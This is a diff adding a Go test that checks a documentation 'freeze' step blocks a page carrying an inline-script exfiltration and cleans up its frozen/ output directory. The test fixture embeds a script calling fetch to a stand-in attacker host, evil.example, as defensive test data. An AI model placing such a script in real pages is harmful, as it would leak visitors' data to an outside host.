@@ -114,6 +114,33 @@ func TestRun_RefusesMermaidWithoutRenderer(t *testing.T) {
 	}
 }
 
+// leakyPage survives widget-strip (no /lib/ or mermaid tags) yet carries an
+// inline-script exfil the leak gate must catch AFTER pages are written to disk.
+const leakyPage = `<!doctype html><html><head></head><body>
+<main class="doc"><h1>Leak</h1></main>
+<script>fetch('https://evil.example/x')</script>
+</body></html>`
+
+// TestRun_BlockedFreezeLeavesNothing proves a blocked freeze leaves no
+// complete-looking trap on disk (finding 2026-08-12 NEW 3). The gate blocks on
+// the inline-exfil, and the sibling frozen/ dir — populated before the check —
+// must be removed on the error path, not stranded beside the real deliverable.
+func TestRun_BlockedFreezeLeavesNothing(t *testing.T) {
+	out := writePublished(t, map[string]string{"index.html": leakyPage})
+
+	res, err := Run(out, "Leaky Doc", "", libDir(t), nil)
+	if err == nil {
+		t.Fatal("freeze must block a page carrying an inline-script exfil")
+	}
+	if res != nil {
+		t.Error("no result on a blocked freeze")
+	}
+	frozen := filepath.Join(filepath.Dir(out), "frozen")
+	if _, statErr := os.Stat(frozen); !os.IsNotExist(statErr) {
+		t.Errorf("a blocked freeze must leave NO frozen/ dir behind (trap artifact); stat err = %v", statErr)
+	}
+}
+
 // TestRun_BakesWithInjectedRenderer proves that with a renderer present, the
 // live mermaid div is replaced by the rendered SVG, the offline pan-zoom kit is
 // inlined, and the frozen page still passes the leak gate. The renderer is a
